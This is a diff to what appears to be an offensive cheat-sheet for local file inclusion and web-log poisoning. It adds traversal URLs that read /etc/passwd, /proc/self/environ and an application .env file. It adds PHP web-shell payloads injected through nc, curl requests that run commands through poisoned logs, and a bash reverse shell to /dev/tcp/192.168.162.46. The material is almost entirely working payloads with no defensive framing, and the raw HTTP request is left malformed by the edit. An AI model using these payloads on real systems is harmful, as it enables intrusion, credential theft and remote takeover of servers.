@@ -135,6 +135,10 @@ http://web/dept/?lang=/etc/passwd
 http://web/dept/manage.php?notes=files/comments.txt 
 http://web/dept/?lang=/windows/system32/drivers/etc/hosts 
 http://web/dept/?lang=\\192.168.162.46\hello.txt   
+http://web/dept/?lang=../../../../etc/passwd
+http://web/dept/?lang=../../../../proc/self/cmdline
+http://web/dept/?lang=../../../../proc/self/environ
+http://web/dept/?lang=../hubot/.env
 
 Poison
 ../../../../../../var/log/auth
@@ -345,9 +349,8 @@ http://abc.so/file.php?file=/../../etc/passwd%00  .. win
 Web Log Poison
 
 nc 192.168.200.5 80
+GET /<?php system($_GET['cmd']); ?>
 GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
-Host: 192.168.200.5
-Connection: close
 
 curl http://192.168.200.5/menu.php?file=%2Fvar%2Flog%2Fhttpd-access.log&cmd=whoami 
 curl http://192.168.200.5/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
@@ -363,6 +366,9 @@ curl http://192.168.200.5/view.php?page=../../../../../var/log/auth.log
 curl http://192.168.200.5/page.php?file=../../../../../../../var/log/auth
 http://192.168.200.5/page.php?file=../../../../../../../var/log/auth?cmd=id
 http://192.168.200.5/page.php?file=../../../../../../../var/log/auth?cmd=cat /etc/passwd
+
+Reverse
+cmd=bash -c 'bash -i >& /dev/tcp/192.168.162.46/80 0>&1'  ..urlencode
 
 
 =================================== 
